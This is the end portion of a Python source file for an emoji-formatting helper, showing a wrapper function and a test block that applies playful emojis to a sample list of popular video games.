        mode: 'formal', 'balanced', or 'playful'
    
    Returns:
        Formatted text with contextually relevant emojis
    """
    handler = EmojiPersonality(mode)
    formatter = SmartEmojiFormatter(handler)
    return formatter.format(text, query)


# --------------------------------------------------
# 🧪 Test
# --------------------------------------------------

if __name__ == "__main__":
    test_text = """This sounds fun! A new question! 
Based on recent trends and user interest, here are the top 5 popular games across various platforms:

Fortnite: A battle royale game where players fight to be the last one standing. It's known for its colorful graphics and addictive gameplay. (Available on PC, consoles, and mobile)
Minecraft: A sandbox-style game that lets players build and explore a blocky world filled with creatures, resources, and treasures. It's a great game for both creative and survival modes. (Available on PC, consoles, and mobile)
PlayerUnknown's Battlegrounds (PUBG): Another battle royale game that challenges players to survive on a large map with up to 99 other players. It's known for its realistic graphics and intense gameplay. (Available on PC, consoles, and mobile)
Call of Duty: Modern Warfare: A first-person shooter game that focuses on fast-paced action, multiplayer modes, and a strong single-player campaign. It's a popular choice for fans of the Call of Duty series. (Available on PC, consoles)
Grand Theft Auto V: An open-world game that lets players explore the city of Los Santos, complete missions, and engage in various activities like driving, shooting, and role-playing. It's a classic game with a huge following. (Available on PC, consoles)

These games are all highly rated and have a large player base. However, keep in mind that popularity can vary depending on the platform, region, and time."""

    result = add_contextual_emojis(test_text, "game recommendations", mode="playful")
    print(result)
